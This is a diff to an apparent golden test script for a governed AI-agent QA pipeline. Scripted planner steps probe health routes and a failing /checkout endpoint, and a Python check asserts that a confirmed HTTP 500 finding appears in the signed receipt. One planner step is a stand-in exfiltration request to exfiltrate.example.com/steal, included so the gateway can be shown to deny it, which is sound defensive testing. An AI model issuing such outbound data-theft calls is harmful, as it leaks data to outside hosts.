@@ -28,11 +28,15 @@ PORT = int(sys.argv[1])
 plans = [
     {"done": False, "steps": [
         {"tool": "http_get", "args": {"url": "http://app.workflo.internal:3457/"},
-         "reason": "check root responds"},
+         "reason": "check a healthy root control route"},
         {"tool": "http_get", "args": {"url": "http://app.workflo.internal:3457/health"},
-         "reason": "check health endpoint"},
+         "reason": "check a healthy health control route"},
+        {"tool": "http_get", "args": {"url": "http://app.workflo.internal:3457/checkout"},
+         "reason": "probe checkout and record the first server error"},
+        {"tool": "http_get", "args": {"url": "http://app.workflo.internal:3457/checkout"},
+         "reason": "repeat checkout to prove the failure is reproducible"},
         {"tool": "http_get", "args": {"url": "http://exfiltrate.example.com/steal"},
-         "reason": "must be denied by the gateway"},
+         "reason": "negative control: this request must be denied by the ToolGateway"},
     ]},
     {"done": True, "steps": []},
 ]
@@ -117,6 +121,28 @@ if [ -z "$RECEIPT" ]; then
   exit 1
 fi
 
+# This scripted mission intentionally finds a reproducible product defect.
+# The Judge must confirm two identical checkout 500s against healthy controls;
+# a blocked exfiltration attempt remains a separate policy-denial observation.
+python3 - "$RECEIPT" <<'PY'
+import json
+import sys
+
+document = json.load(open(sys.argv[1], encoding="utf-8"))
+receipt = document.get("receipt", document)
+findings = receipt.get("run_report", {}).get("findings", [])
+confirmed = [
+    finding for finding in findings
+    if finding.get("status") == "confirmed"
+    and finding.get("title") == "GET /checkout fails (HTTP 500)"
+]
+if not confirmed:
+    print("Expected a confirmed GET /checkout HTTP 500 finding; got:", findings, file=sys.stderr)
+    raise SystemExit(1)
+print("Confirmed reproducible QA finding:", confirmed[0]["title"])
+print("Evidence references:", ", ".join(confirmed[0].get("evidence_refs", [])))
+PY
+
 echo
 echo "==> workflo verify (independent)"
 set +e
@@ -130,8 +156,8 @@ set -e
 cat verify.stderr
 
 echo
-echo "    run exit:    $RUN_EXIT"
+echo "    run exit:    $RUN_EXIT (1 = expected verified finding)"
 echo "    verify exit: $VERIFY_EXIT"
-[ "$RUN_EXIT" -ne 0 ] && { echo "PLANNER GOLDEN FAILED (run)"; exit 1; }
+[ "$RUN_EXIT" -eq 1 ] || { echo "PLANNER GOLDEN FAILED (expected exit code 1 for the confirmed finding)"; exit 1; }
 [ "$VERIFY_EXIT" -ne 0 ] && { echo "PLANNER GOLDEN FAILED (verify)"; exit 1; }
-echo "PLANNER GOLDEN PASSED: LLM planner -> governed agent -> evidence -> signed receipt -> verified"
+echo "PLANNER GOLDEN PASSED: planner -> governed agent -> confirmed QA finding -> signed receipt -> verified"
